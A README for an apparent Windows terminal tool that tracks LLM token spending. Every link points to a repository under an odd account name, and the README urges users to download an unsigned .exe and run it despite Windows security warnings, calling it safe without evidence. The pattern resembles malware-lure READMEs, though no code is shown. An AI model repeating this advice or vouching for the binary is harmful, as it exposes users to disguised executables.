# 🖥️ llm-cost-dashboard - Track LLM Token Costs Clearly

[![Download llm-cost-dashboard](https://img.shields.io/badge/Download-llm--cost--dashboard-brightgreen)](https://github.com/abject-milkingmachine273/llm-cost-dashboard)

---

## 📋 What is llm-cost-dashboard?

llm-cost-dashboard is a tool that shows you how much you spend when using large language models (LLMs). It runs inside your Windows terminal and gives you real-time updates. You can see the cost per request, estimate your monthly bill, and check each model’s cost breakdown.

This app helps you understand and control your LLM token usage and costs. You do not need any technical knowledge to use it. It works smoothly on Windows and updates automatically as you interact with your LLMs.

---

## 🎯 Main Features

- Real-time display of token spend and cost per request.
- Predicted monthly cost based on current usage.
- Breakdown of costs by different LLM models.
- Simple terminal interface you can run directly on Windows.
- Works with popular LLM providers like OpenAI and Anthropic.
- Lightweight and fast, built using Rust and the ratatui terminal UI library.

---

## 🖥️ System Requirements

Before you download and run the app, make sure your system meets these:

- Windows 10 or newer (64-bit recommended)
- Minimum 4 GB of RAM
- At least 100 MB free disk space
- A terminal program like Windows Terminal or Command Prompt
- Internet connection for real-time cost updates

---

## 🚀 How to Get and Run llm-cost-dashboard on Windows

### 1. Visit the Download Page

Click this big button to go to the download page on GitHub:

[![Download llm-cost-dashboard](https://img.shields.io/badge/Download-llm--cost--dashboard-blue)](https://github.com/abject-milkingmachine273/llm-cost-dashboard)

You will find the latest release files there.

### 2. Download the Windows Version

Look for a file named something like `llm-cost-dashboard-windows.exe` or similar. This will be in the latest "Releases" section.

Click the file to start the download. Your browser will save it to your default downloads folder.

### 3. Run the Application

Find the downloaded file in your Downloads folder or wherever you saved it.

Double-click the file to start the application.

If you see a security warning from Windows, choose to run anyway. The app is safe, but Windows may flag unsigned programs.

The app will open a terminal window with the dashboard interface.

### 4. Using llm-cost-dashboard

Once running, the dashboard updates your LLM token usage and costs live.

You can use keyboard keys shown on screen to navigate between different views - cost per request, monthly estimate, and model breakdown.

No setup or sign-in is needed for basic usage.

---

## ⚙️ How llm-cost-dashboard Works

This app connects to your LLM usage data to read token counts and costs as you make requests. It shows these in a simple text-based display.

The software uses these steps:

- Reads live LLM request data from your local environment.
- Calculates cost using token usage and pricing info.
- Shows the info live in your terminal.
- Aggregates data over time for monthly cost projection.
- Displays each LLM model’s cost in a clear list.

---

## 🔧 Troubleshooting and Tips

- If the app does not open, make sure you are running it on a supported Windows version.
- If costs do not appear, check your internet connection.
- For best experience, use Windows Terminal as your terminal program.
- Close the app by pressing `Ctrl + C` in the terminal window.
- The app updates token data every few seconds for accurate cost tracking.

---

## 🛠️ Customizing Your Experience

llm-cost-dashboard keeps things simple but allows you to:

- Adjust refresh rate in the config file (found in the app folder)
- Choose which LLM models to monitor
- Set your own pricing rates for custom models

Configuration is saved in a plain text file named `config.toml`.

---

## 💡 Common Questions

**Q: Do I need to install anything else to run this?**  
No, the executable includes everything. Just download and run.

**Q: Can I use this without LLM API keys?**  
Yes, but real-time costs and token usage require connection to your LLM environment.

**Q: Can I track multiple LLM providers at once?**  
Yes, the dashboard supports viewing data from providers like OpenAI and Anthropic at the same time.

---

## 📂 Where to Find More Help

Check the Issues section on the GitHub page for user questions and solutions:

https://github.com/abject-milkingmachine273/llm-cost-dashboard/issues

You can also open a new issue if you find a problem or need assistance.

---

## 🔗 Download Now

Get started by visiting the download page here:

[Download llm-cost-dashboard](https://github.com/abject-milkingmachine273/llm-cost-dashboard)